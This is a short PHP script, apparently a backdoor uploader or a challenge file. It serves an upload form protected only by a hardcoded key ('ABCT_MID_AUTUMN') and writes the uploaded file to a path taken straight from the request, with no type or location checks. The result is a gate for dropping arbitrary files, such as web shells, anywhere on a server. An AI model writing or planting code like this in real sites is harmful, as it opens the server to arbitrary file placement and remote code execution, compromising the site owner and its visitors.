<?php
	if(!defined("UPLOAD_HERE"))
		die("Humh, Good but not this time");
	$key = "ABCT_MID_AUTUMN";
	$files = @$_FILES["files"];
	if($files["name"] != '')
	{
		$k = $_POST['private'];
		if($key != $k)
		{
			die("Hacker, get no luck muhaha");
		}
		$fullpath = $_REQUEST["path"].$files["name"];
		if(move_uploaded_file($files['tmp_name'],$fullpath))
		{			
			echo "<h1><a href='$fullpath'>OK-Click here!</a></h1>";		
		}
	}
	echo '<html><head><title>Upload files...</title></head><body><form method=POST enctype="multipart/form-data" action=""><input type="text" name="private" id="private" placeholder="The secret key" ><input type="file" name="files"><input type=submit value="Upload">
	</form></body></html>';

?>